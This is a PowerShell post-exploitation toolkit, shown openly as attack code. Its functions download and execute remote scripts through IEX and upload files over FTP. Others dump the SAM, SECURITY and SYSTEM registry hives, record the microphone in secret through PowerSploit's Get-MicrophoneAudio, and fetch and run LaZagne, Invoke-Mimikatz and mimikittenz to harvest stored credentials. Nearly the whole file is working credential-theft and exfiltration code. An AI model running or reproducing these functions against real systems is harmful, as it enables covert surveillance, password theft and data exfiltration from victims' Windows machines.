#Download -url "https://example.com/file.txt" -outfile "c:\windows\temp\file.txt"
function Download ($url, $filename)
{
   (New-Object System.Net.WebClient).DownloadFile($url, $filename)
}

#DownloadString -url "http://example.com/a.ps1" 
function DownloadString($url)
{
    (New-Object System.Net.WebClient).DownloadString($url);
}

#Unzip -zipfile "myzip.zip" -path "c:\windows\temp"
function Unzip($zipfile, $path)
{
    $shell = new-object -com shell.application;
    foreach($item in $shell.NameSpace($zipfile).items())
    {
        $shell.Namespace($path).copyhere($item)
    }
}

#UploadFtp -address "192.168.0.1" -username "username" -password "password" -pathFileName "/folder/file.txt" -uploadfile "file.txt"
function UploadFtp($address, $username, $password, $pathFileName, $uploadfile)
{
    $uriString = "ftp://" + $username + ":" + $password + "@" + $address + $pathFileName;
    (New-Object System.Net.WebClient).UploadFile((New-Object System.Uri($uriString) ), $uploadfile);
}

#DumpHives
function DumpHives($dumpfolder)
{   
    Reg save HKLM\SAM (Join-Path $dumpfolder "sam.hiv");
    Reg save HKLM\SECURITY (Join-Path $dumpfolder "security.hiv");
    Reg save HKLM\SYSTEM (Join-Path $dumpfolder "system.hiv");
}

#RunVoiceRecord -fullPathOutput "C:\windows\temp\secret.wav" -seconds 120
function RunVoiceRecord($fullPathOutput, $seconds)
{
    IEX (DownloadString -url "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1");
    Get-MicrophoneAudio -Path $fullPathOutput -Length $seconds -Alias "top_secret";
}

#RunMitmp
function RunMitmp()
{
    $path = $env:TEMP;
    $filename = "mitmp.zip";
    $fullpath = Join-Path $path $filename;
    Download -url "https://github.com/mitmproxy/mitmproxy/releases/download/v2.0.2/mitmproxy-2.0.2-windows.zip" -filename $fullpath;
    Unzip -zipfile $fullpath -path $path;
    $mitmp = Join-Path $path "mitmdump.exe";
    & $mitmp;
}

#RunLazagne
function RunLazagne()
{
    $path = $env:TEMP;
    $filename = "laza.zip";
    $fullpath = Join-Path $path $filename;
    Download -url "https://github.com/AlessandroZ/LaZagne/releases/download/2.3.1/Windows.zip" -filename $fullpath;
    Unzip -zipfile $fullpath -path $path;
    $lazagne = Join-Path $path "/Windows/laZagne.exe";
    & $lazagne "all";
}

#RunMimikatz
function RunMimikatz()
{
    IEX (DownloadString -url "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1");
    Invoke-Mimikatz -DumpCreds;
}

#RunMimikittenz
function RunMimikittenz()
{
    IEX (DownloadString -url "https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1");
    Invoke-mimikittenz;
}
